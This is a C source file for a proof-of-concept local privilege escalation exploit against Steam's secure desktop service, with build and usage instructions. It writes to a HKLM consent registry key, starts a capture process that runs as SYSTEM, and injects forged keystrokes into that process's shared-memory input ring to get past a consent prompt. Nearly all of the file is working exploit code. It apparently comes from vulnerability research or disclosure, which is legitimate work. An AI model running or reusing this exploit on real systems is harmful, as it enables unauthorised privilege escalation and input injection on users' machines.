// Build: cl /nologo /O2 lpe_securedesktop.c /Fe:lpe_securedesktop.exe advapi32.lib
// Usage: lpe_securedesktop.exe [steamclient64.dll]
#include "poc_connect.h"
#include <time.h>

#define INPUT_SHM_NAME     "Global\\SecureDesktopInput_mem-IPCWrapper"
#define INPUT_SHM_SIZE     0x5AA0
#define WRITE_COUNTER_OFF  0x414  
#define READ_COUNTER_OFF   0x418 
#define SLOTS_BASE_OFF     0x41C
#define SLOT_SIZE          173
#define SD_SOURCE_KEY      "Software\\Valve\\Steam\\SecureDesktop"

// Prime the consent cache SOURCE. Returns 1 iff the key is attacker-writable.
static int prime_hklm_source(void) {
    HKEY k;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, SD_SOURCE_KEY, 0, NULL, 0,
                        KEY_SET_VALUE | KEY_WOW64_32KEY, NULL, &k, NULL) != ERROR_SUCCESS)
        return 0;
    DWORD enabled = 1, ts = (DWORD)time(NULL);
    LONG r1 = RegSetValueExA(k, "InputEnabled",   0, REG_DWORD, (const BYTE *)&enabled, 4);
    LONG r2 = RegSetValueExA(k, "InputTimestamp", 0, REG_DWORD, (const BYTE *)&ts, 4);
    RegCloseKey(k);
    return r1 == ERROR_SUCCESS && r2 == ERROR_SUCCESS;
}

static void write_input_slot(char *shm, INPUT *ev) {
    DWORD *wc = (DWORD *)(shm + WRITE_COUNTER_OFF);
    char *slot = shm + SLOTS_BASE_OFF + SLOT_SIZE * (*wc & 0x7F);
    slot[0] = 0;                            // flag = plaintext
    memcpy(slot + 1, ev, sizeof(INPUT));    // 40-byte tagINPUT (x64)
    *wc += 1;
}

int main(int argc, char **argv)
{
    char dll[MAX_PATH] = {0};
    for (int i = 1; i < argc; i++) lstrcpynA(dll, argv[i], sizeof(dll));

    CSteamServiceWin32 *svc = steam_connect(dll[0] ? dll : NULL);
    if (!svc) return 1;

    int rc = 1;
    __try {
        IClientSecureDesktopMap *sd = svc->pSecureDesktop;
        if (!sd) { printf("[!] IClientSecureDesktop not available\n"); __leave; }

        // tear down any stale capture so a fresh one hits the first-time consent path.
        sd->vtbl->StopStreaming(sd);
        Sleep(1000);
        printf("[*] consent SOURCE prime: %s\n",
               prime_hklm_source() ? "OK" : "DENIED");

        printf("[*] BStartStreaming -> spawn secure_desktop_capture.exe as SYSTEM\n");
        uint8_t ok = sd->vtbl->BStartStreaming(sd);
        printf("[+] BStartStreaming = %u\n", ok);
        Sleep(2000);

        HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, INPUT_SHM_NAME);
        if (!hMap) { printf("[!] OpenFileMapping failed: %lu (capture not spawned?)\n", GetLastError()); __leave; }
        char *shm = (char *)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, INPUT_SHM_SIZE);
        if (!shm) { printf("[!] MapViewOfFile failed: %lu\n", GetLastError()); CloseHandle(hMap); __leave; }

        DWORD rc_before = *(DWORD *)(shm + READ_COUNTER_OFF);
        INPUT ev = {0}; ev.type = INPUT_KEYBOARD; ev.ki.wVk = 'Y';
        write_input_slot(shm, &ev);                         // keydown
        ev.ki.dwFlags = KEYEVENTF_KEYUP; write_input_slot(shm, &ev);  // keyup
        printf("[*] wrote VK_Y down/up into the input ring; waiting for capture...\n");
        Sleep(3000);
        DWORD rc_after = *(DWORD *)(shm + READ_COUNTER_OFF);

        if (rc_after > rc_before) {
            printf("[+] capture advanced read_counter by %u -- input delivered to the secure desktop\n",
                   rc_after - rc_before);
            rc = 0;
        } else {
            printf("[-] read_counter did not advance (consent gate pending, or capture not running?!)\n");
            rc = 2;
        }
        UnmapViewOfFile(shm);
        CloseHandle(hMap);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] faulted 0x%08lX\n", GetExceptionCode());
    }

    return rc;
}
